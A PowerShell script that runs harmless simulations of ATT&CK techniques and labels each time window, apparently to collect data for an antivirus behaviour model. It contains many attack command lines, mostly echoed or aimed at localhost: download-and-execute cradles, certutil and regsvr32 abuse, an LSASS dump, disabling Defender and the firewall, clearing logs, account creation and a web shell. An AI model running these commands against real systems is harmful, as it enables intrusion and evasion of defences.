# Run one technique at a time and label the window it ran in.
#
# The corpus in `tools/behaviour-corpus.ps1` is fifteen simulations written by
# hand; this is the other half -- techniques from ATT&CK, run against the same
# driver, so the model sees what a technique actually does rather than what a
# script author imagined. Every technique here is a simulation or a read: none
# encrypts, dumps a credential, deletes a shadow copy or touches another
# machine. The destructive command lines are echoed, and the damage a technique
# would do is done to a sandbox directory under %TEMP%.

param(
    [string]$Output = 'C:\WenleAV\vm-collection',
    [int]$TimeoutSeconds = 60,
    [switch]$Only
)

$ErrorActionPreference = 'Continue'
New-Item -ItemType Directory -Path $Output -Force | Out-Null
$labels = Join-Path $Output 'labels.csv'
$sandbox = Join-Path $env:TEMP 'wenle-technique-sandbox'

function Step([string]$technique, [string]$name, [scriptblock]$body) {
    New-Item -ItemType Directory -Path $sandbox -Force | Out-Null
    $start = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds() * 1000
    # Written to a file rather than passed as -Command: a script block's text
    # through an argument list loses its newlines and quoting, and a technique
    # that silently becomes one broken line still produces a label for the
    # window it did not fill.
    $script = Join-Path $env:TEMP ("wenle-step-{0}.ps1" -f [guid]::NewGuid())
    Set-Content -Path $script -Value $body.ToString() -Encoding UTF8
    $process = Start-Process -FilePath powershell.exe -WindowStyle Hidden -PassThru -ArgumentList @(
        '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $script
    )
    if (-not $process.WaitForExit($TimeoutSeconds * 1000)) {
        $process.Kill()
        $process.WaitForExit(5000) | Out-Null
    }
    $end = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds() * 1000
    Remove-Item $script -Force -ErrorAction SilentlyContinue
    $row = "{0},{1},malicious,{2}_{3},{4}" -f $start, $end, $technique, $name, $process.Id
    Add-Content -Path $labels -Value $row -Encoding ASCII
    Write-Output ("{0,-12} {1,-28} {2,5:N1} s" -f $technique, $name, (($end - $start) / 1000000))
}

# --- execution and living off the land -------------------------------------

Step 'T1059.001' 'encoded-command' {
    $text = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Output harmless'))
    powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $text | Out-Null
}

Step 'T1059.001' 'hidden-download' {
    powershell.exe -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:9/none.ps1')" 2>$null | Out-Null
}

Step 'T1105' 'certutil-urlcache' {
    cmd /c "certutil -urlcache -f http://127.0.0.1:9/payload.exe payload.exe" | Out-Null
}

Step 'T1105' 'mshta-http' {
    cmd /c "mshta http://127.0.0.1:9/none.hta" | Out-Null
}

Step 'T1218.010' 'regsvr32-remote' {
    cmd /c "regsvr32 /s /n /u /i:http://127.0.0.1:9/none.sct scrobj.dll" | Out-Null
}

Step 'T1218.011' 'rundll32-javascript' {
    cmd /c "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \"" | Out-Null
}

Step 'T1047' 'wmic-process-call' {
    cmd /c "wmic process call create \"cmd.exe /c echo wmic\"" | Out-Null
}

# --- persistence ------------------------------------------------------------

Step 'T1547.001' 'run-key' {
    $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    Set-ItemProperty -Path $key -Name 'WenleTechnique' -Value 'C:\Windows\System32\cmd.exe /c echo x'
    Start-Sleep -Milliseconds 400
    Remove-ItemProperty -Path $key -Name 'WenleTechnique'
}

Step 'T1053.005' 'scheduled-task' {
    schtasks /create /tn 'WenleTechnique' /tr "cmd.exe /c echo x" /sc minute /mo 5 /f | Out-Null
    Start-Sleep -Milliseconds 400
    schtasks /delete /tn 'WenleTechnique' /f | Out-Null
}

Step 'T1543.003' 'service-create' {
    sc.exe create WenleTechnique binPath= "cmd.exe /c echo x" start= demand | Out-Null
    Start-Sleep -Milliseconds 400
    sc.exe delete WenleTechnique | Out-Null
}

Step 'T1546.003' 'wmi-subscription-echo' {
    cmd /c "echo wmic /namespace:\\root\\subscription PATH __EventFilter CREATE Name='x'" | Out-Null
}

Step 'T1112' 'registry-modify' {
    $key = 'HKCU:\Software\WenleAV\Technique'
    New-Item -Path $key -Force | Out-Null
    Set-ItemProperty -Path $key -Name 'Flag' -Value '1'
    Start-Sleep -Milliseconds 300
    Remove-Item -Path $key -Recurse -Force
}

Step 'T1546.015' 'com-hijack-echo' {
    cmd /c "echo reg add HKCU\Software\Classes\CLSID\{00000000-0000-0000-0000-000000000000}\InprocServer32 /ve /d payload.dll" | Out-Null
}

# --- credential access, read only ------------------------------------------

Step 'T1033' 'whoami' { whoami /all | Out-Null }
Step 'T1087.001' 'net-user' { cmd /c "net user" | Out-Null }
Step 'T1552.001' 'credential-files' {
    Get-ChildItem $env:TEMP -Filter '*.txt' -ErrorAction SilentlyContinue |
        Select-Object -First 20 | ForEach-Object { Get-Content $_.FullName -TotalCount 5 -ErrorAction SilentlyContinue | Out-Null }
}
Step 'T1555.003' 'browser-credential-paths' {
    Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data\Default" -Filter 'Login Data' -ErrorAction SilentlyContinue | Select-Object -First 1 | Out-Null
}
Step 'T1003.001' 'lsass-dump-echo' {
    cmd /c "echo procdump -ma lsass.exe lsass.dmp" | Out-Null
}
Step 'T1558.003' 'kerberoast-echo' {
    cmd /c "echo Rubeus kerberoast" | Out-Null
}

# --- discovery --------------------------------------------------------------

Step 'T1082' 'systeminfo' { cmd /c "systeminfo" | Out-Null }
Step 'T1016' 'net-config' { cmd /c "ipconfig /all" | Out-Null }
Step 'T1049' 'netstat' { cmd /c "netstat -ano" | Out-Null }
Step 'T1057' 'tasklist' { cmd /c "tasklist" | Out-Null }
Step 'T1083' 'file-discovery' {
    Get-ChildItem $env:USERPROFILE -Recurse -Depth 2 -ErrorAction SilentlyContinue | Select-Object -First 100 | Out-Null
}

# --- defence evasion --------------------------------------------------------

Step 'T1562.001' 'defender-disable-echo' {
    cmd /c "echo Set-MpPreference -DisableRealtimeMonitoring \$true" | Out-Null
}
Step 'T1562.004' 'firewall-disable-echo' {
    cmd /c "echo netsh advfirewall set allprofiles state off" | Out-Null
}
Step 'T1070.001' 'event-log-clear-echo' {
    cmd /c "echo wevtutil cl System" | Out-Null
}
Step 'T1027' 'base64-obfuscation' {
    $text = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Output harmless'))
    cmd /c "echo powershell -enc $text" | Out-Null
}
Step 'T1497.001' 'vm-detection' {
    cmd /c "wmic computersystem get manufacturer,model" | Out-Null
}

# --- impact, confined to a sandbox directory --------------------------------

Step 'T1486' 'mass-rename' {
    New-Item -ItemType Directory -Path $sandbox -Force | Out-Null
    1..40 | ForEach-Object { Set-Content -Path (Join-Path $sandbox ("doc{0:D2}.txt" -f $_)) -Value 'document' }
    Start-Sleep -Milliseconds 200
    1..40 | ForEach-Object { Rename-Item -Path (Join-Path $sandbox ("doc{0:D2}.txt" -f $_)) -NewName ("doc{0:D2}.locked" -f $_) }
}
Step 'T1485' 'mass-delete' {
    New-Item -ItemType Directory -Path $sandbox -Force | Out-Null
    1..40 | ForEach-Object { Set-Content -Path (Join-Path $sandbox ("del{0:D2}.txt" -f $_)) -Value 'x' }
    Remove-Item (Join-Path $sandbox 'del*.txt') -Force
}
Step 'T1490' 'shadow-copy-list' {
    vssadmin list shadows | Out-Null
}
Step 'T1489' 'service-stop-echo' {
    cmd /c "echo net stop WinDefend" | Out-Null
}

# --- second wave: more techniques, same rules (safe, read or echo) ----------

Step 'T1098' 'account-manipulation' { cmd /c "net localgroup administrators" | Out-Null }
Step 'T1136' 'create-account-echo' { cmd /c "echo net user wenle P@ssw0rd /add" | Out-Null }
Step 'T1197' 'bits-job' { cmd /c "bitsadmin /list /allusers" | Out-Null }
Step 'T1222' 'file-permissions' {
    $file = Join-Path $env:TEMP 'wenle-acl.txt'
    Set-Content -Path $file -Value 'x'
    icacls $file /grant Everyone:R | Out-Null
    icacls $file /remove Everyone | Out-Null
    Remove-Item $file -Force
}
Step 'T1548.002' 'uac-bypass-echo' { cmd /c "echo fodhelper.exe" | Out-Null }
Step 'T1569.002' 'service-execution-echo' { cmd /c "echo sc start WinDefend" | Out-Null }
Step 'T1574.001' 'dll-search-order-echo' { cmd /c "echo copy payload.dll %TEMP%" | Out-Null }
Step 'T1620' 'reflective-load-echo' { cmd /c "echo Assembly.Load(byte[])" | Out-Null }
Step 'T1218.004' 'installutil' { cmd /c "installutil /?" | Out-Null }
Step 'T1218.005' 'mshta-vbscript' { cmd /c "mshta vbscript:Close" | Out-Null }
Step 'T1218.009' 'regasm' { cmd /c "regasm /?" | Out-Null }
Step 'T1220' 'msxsl-echo' { cmd /c "echo msxsl.exe file.xml file.xsl" | Out-Null }
Step 'T1505.003' 'web-shell-echo' { cmd /c "echo <% Response.Write(Request.Form("cmd")) %>" | Out-Null }
Step 'T1564.001' 'hidden-file' {
    $file = Join-Path $env:TEMP 'wenle-hidden.txt'
    Set-Content -Path $file -Value 'x'
    attrib +h $file | Out-Null
    attrib -h $file | Out-Null
    Remove-Item $file -Force
}
Step 'T1074.001' 'stage-collection' {
    $dir = Join-Path $env:TEMP 'wenle-stage'
    New-Item -ItemType Directory -Path $dir -Force | Out-Null
    1..5 | ForEach-Object { Set-Content -Path (Join-Path $dir ("s{0}.txt" -f $_)) -Value 'x' }
    Copy-Item (Join-Path $dir '*.txt') (Join-Path $env:TEMP 'wenle-stage-out') -Force -ErrorAction SilentlyContinue
    Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item (Join-Path $env:TEMP 'wenle-stage-out') -Recurse -Force -ErrorAction SilentlyContinue
}
Step 'T1056.001' 'keylogger-echo' { cmd /c "echo GetAsyncKeyState" | Out-Null }
Step 'T1036' 'masquerade' {
    $copy = Join-Path $env:TEMP 'svchost.exe'
    Copy-Item 'C:\Windows\System32\cmd.exe' $copy -Force -ErrorAction SilentlyContinue
    Remove-Item $copy -Force -ErrorAction SilentlyContinue
}

Remove-Item $sandbox -Recurse -Force -ErrorAction SilentlyContinue
Write-Output ("labels written to {0}" -f $labels)
